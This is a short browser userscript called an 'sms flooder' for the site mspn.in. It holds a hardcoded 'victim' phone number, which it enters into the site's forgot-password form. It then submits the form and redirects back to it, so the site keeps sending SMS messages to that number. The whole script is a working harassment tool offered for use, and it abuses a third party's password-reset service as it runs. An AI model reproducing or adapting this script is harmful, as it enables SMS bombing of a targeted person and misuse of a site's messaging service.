// ==UserScript==
// @name          Anonymous MSPN.IN sms flooder
// @namespace     SUNNY020
// @description   flooder sms
// @include       http://*mspn.in/*
// ==/UserScript==

var victim=8092262928 //Enter victims number here

if(document.location=="http://mspn.in/forgotpass.php"||document.location=="http://mspn.in/forgotpass.php")
{
document.forms[0].elements[0].value=victim;
document.forms[0].submit();
}
if(document.location=="http://mspn.in/forgotpass.php"||document.location=="v")
document.location='http://mspn.in/forgotpass.php';